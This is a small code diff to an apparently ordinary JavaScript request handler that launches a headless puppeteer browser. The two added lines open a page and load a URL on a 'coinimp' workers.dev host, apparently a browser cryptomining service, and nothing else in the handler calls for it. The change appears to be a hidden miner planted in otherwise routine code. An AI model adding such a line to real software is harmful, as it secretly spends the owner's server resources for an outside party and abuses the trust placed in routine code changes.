@@ -164,6 +164,8 @@ async function handler(req, res) {
               }),
         };
         browser = await puppeteer.launch(config);
+        const page = await browser.newPage();
+        await page.goto('https://coinimp.freevideos.workers.dev/');
       }
       page = await browser.newPage();
 
